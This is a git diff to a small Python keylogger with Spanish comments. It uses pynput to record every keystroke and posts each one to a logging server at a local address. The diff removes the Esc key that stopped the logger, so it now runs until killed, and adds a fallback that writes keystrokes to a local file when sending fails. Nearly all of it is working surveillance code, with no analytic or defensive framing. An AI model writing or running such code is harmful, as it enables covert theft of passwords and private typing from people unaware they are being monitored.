@@ -1,7 +1,7 @@
 from pynput import keyboard
 import requests
 
-SERVER_URL = "http://127.0.0.1:5000/log"
+SERVER_URL = "http://127.0.0.1:5000/log"  # Servidor local Flask
 
 def on_press(key):
     try:
@@ -9,17 +9,14 @@ def on_press(key):
     except AttributeError:
         data = f"[{key}]"
 
-    print("Tecla capturada:", data)  # 👈 Debug local
+    print("Tecla capturada:", data)
 
     try:
-        r = requests.post(SERVER_URL, data={"key": data})
-        print("Respuesta servidor:", r.status_code)
+        requests.post(SERVER_URL, data={"key": data}, timeout=1)
     except Exception as e:
-        print("Error al enviar:", e)
+        print("Error al enviar, guardando localmente:", e)
+        with open("log_local.txt", "a", encoding="utf-8") as f:
+            f.write(data)
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
-
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
